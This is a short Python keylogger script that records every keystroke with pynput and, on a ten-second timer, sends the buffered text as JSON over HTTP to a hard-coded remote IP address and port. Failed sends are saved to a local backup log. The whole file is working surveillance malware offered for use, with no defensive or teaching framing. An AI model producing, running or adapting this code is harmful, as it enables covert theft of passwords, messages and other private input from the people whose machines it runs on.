from pynput import keyboard
import requests
import json
import threading
from threading import Lock
import os

# Configuration
ip_address = "109.74.200.23"
port_number = "8080"
use_https = False  # Set to True if your server supports HTTPS
time_interval = 10  # Time interval in seconds

# Shared resources
text = ""
text_lock = Lock()
timer = None

def log_locally(data):
    """Write data to a local file in case of network failure."""
    try:
        with open("keystrokes_backup.log", "a") as f:
            f.write(data)
    except Exception as e:
        print(f"[!] Failed to write locally: {e}")

def send_post_req():
    global text, timer
    try:
        with text_lock:
            if not text:
                # Nothing to send
                timer = threading.Timer(time_interval, send_post_req)
                timer.start()
                return

            payload = json.dumps({"keyboardData": text})
            url = f"{'https' if use_https else 'http'}://{ip_address}:{port_number}"

            response = requests.post(url, data=payload, headers={"Content-Type": "application/json"})
            response.raise_for_status()
            print(f"[+] Sent data: {text.strip()}")
            text = ""  # Clear buffer after sending

    except Exception as e:
        print(f"[!] Error sending data: {e}")
        with text_lock:
            log_locally(text)
            text = ""  # Clear anyway to avoid duplicates

    finally:
        # Restart the timer
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()

def on_press(key):
    global text, timer

    try:
        with text_lock:
            # Handle special keys
            if key == keyboard.Key.enter:
                text += "\n"
            elif key == keyboard.Key.tab:
                text += "\t"
            elif key == keyboard.Key.space:
                text += " "
            elif key == keyboard.Key.backspace and text:
                text = text[:-1]
            elif isinstance(key, keyboard.KeyCode):
                # Regular character key
                if key.char:
                    text += key.char
            elif key == keyboard.Key.esc:
                print("[*] Exiting on ESC key...")
                if timer:
                    timer.cancel()
                return False  # Stop listener

    except Exception as e:
        print(f"[!] Error in on_press: {e}")

if __name__ == "__main__":
    print("[*] Starting keylogger...")
    send_post_req()  # Start the timer
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
